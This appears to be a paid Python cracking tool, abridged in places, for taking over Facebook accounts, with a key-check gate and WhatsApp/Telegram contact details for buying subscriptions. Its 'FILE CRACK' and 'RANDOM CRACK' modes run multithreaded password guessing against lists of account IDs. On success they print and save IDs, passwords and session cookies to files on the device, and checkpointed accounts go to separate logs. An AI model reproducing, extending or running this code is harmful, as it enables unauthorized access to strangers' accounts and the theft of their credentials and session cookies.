...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT :MIRAZ KING
# GITHUB LINK : ARIYAN5050
# MACK BY : MIRAZ KHAN
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
from os import path
...
class Get_Data:
    def __init__(self):
        self.url = "https://miraz.blogspot.com/2024/06/amo.html"
    def get(self):
        respone = requests.get("https://miraz.blogspot.com/2024/06/amo.html").text
...
class Main:
    ...
    def check(self):
        if self.status == "EXPIRE-KEY":
            clear();print(f"{A}[{R}={A}] {G}USERNAME{R} : {A}MIRAZ KING");print(f"{A}[{R}={A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}={A}] {G}YOU ARE NOT PREMUIM USER FIRST BUY PREMUIM');linex();print(f"{A}[{R}={A}] {G}IF YOU WANT TO BUY COMMAND BY YOUR OWN WILLING, SEND {A}350 [15 DAYS] {G}|{A} 600 [30 DAYS] {G}TO THE GIVEN BKASH ACCOUNT AND SEND YOUR TOKEN AND PAYMENT SCREENSHOT TO THE GIVEN WHATSAPP NUMBER");linex();print(f"{A}[{R}={A}] {G}1 TOKEN IS ONLY FOR 1 DEVICE, YOU CANNOT TRANSFER YOUR SUBSCRIPTION");linex();print(f"{A}[{R}={A}] {G}YOUR ARE ONLY ELIGIBLE TO GET REFUND OR AGAIN SUBSCRIPTION, IF YOURTOKEN IS NOT CHANGED. IF HAPPENS, YOU WILL NOT BE ABLE TO CLAIM REFUND OR RECOVERY OF SUBSCRIPTION");linex();print(f"{A}[{R}={A}] {G}IF YOUR SUBSCRIPTION ENDS BY CLEARING DATA, SYSTEM UPDATE,DELETING TERMUX OR DOWNGRADING AND UPGRADING TERMUX APK, YOUR WILL NOT BE ABLE TO GET SUBSCRIPTION UNTILL YOU PAY AGAIN");linex();print(f"{A}[{R}={A}] {G}WHATSAPP NUMBER{R} >> {G}+8801924709552");linex();input(f"{A}[{R}={A}] {G}TELEGRAM ID    {R} >> {G}@mirazfire");linex()
            sys.exit()
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<💚MIRAZ KING💚>\x07')
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
logo=f"""{G} 
888b     d888 8888888 8888888b.         d8888 8888888888P 
8888b   d8888   888   888   Y88b       d88888       d88P  
88888b.d88888   888   888    888      d88P888      d88P   
888Y88888P888   888   888   d88P     d88P 888     d88P    
888 Y888P 888   888   8888888P"     d88P  888    d88P     
888  Y8P  888   888   888 T88b     d88P   888   d88P      
888   "   888   888   888  T88b   d8888888888  d88P       
888       888 8888888 888   T88b d88P     888 d8888888888 
                                                                                                                                                                             
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{A}[{R}={A}] {G}FACEBOOK   {R} >>   {A}MIRAZ KHAN
{A}[{R}={A}] {G}STATUS      {R}>>   {A}FILE {R}X{A} RANDOM
{A}[{R}={A}] {G}VERSION   {R}  >>   {A}0.6
{A}[{R}={A}] {G}GITHUB    {R}  >>   {A}https://github.com/ARIYAN5050
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
        try:                        
                        clear();print(f"{A}[{R}={A}] {G}USERNAME{R} : {A}MIRAZ KING");print(f"{A}[{R}={A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}1{A}] {G}FILE CRACK\n{A}[{R}2{A}] {G}RANDOM CRACK\n{A}[{R}3{A}] {G}JOINT PUBLIC GROUP \n{A}[{R}4{A}] {G}EXIT')
                        linex()
                        miraz=input(f'{A}[{R}={A}] {G}INPUT {R}>>{A} ')
                        if miraz in ['1','01']:
                                clear();print(f'{A}[{R}={A}]{G} EXAMPLE {R}:{A} /sdcard/miraz.txt');linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f"{A}[{R}={A}] {G}USERNAME{R} : {A}MIRAZ KING");print(f"{A}[{R}={A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}={A}]{G} SIM NAME  {R}>> {A}ROBI {R}>>{A} BANGLALINK ')
                                ...
                                os.system('xdg-open https://www.facebook.com/RABBI');menu()
                        elif miraz in ['0','00']:
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}miraz-F1{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m{A}[{G}miraz-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} {coki}")
                open('/sdcard/miraz-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[miraz-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/miraz-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}miraz-F2{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
             ...
             #   print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{R} {coki}")
                open('/sdcard/miraz-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[miraz-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/miraz-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r{R}[{G}miraz-F3{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m{A}[{G}miraz-OK💉{A}]{G} '+ids+f' {R}•{G} '+pas+'')
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} {coki}")
                open('/sdcard/miraz-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}[miraz-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/miraz-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\r{A}[{G}miraz-RN{A}] >> {A}[{R}{loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(oks)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r\x1b[38;5;46m{A}[{G}miraz-OK💉{A}]{G} {uid} | {pas}')
                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{BU} {coki}")
                open('/sdcard/miraz-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
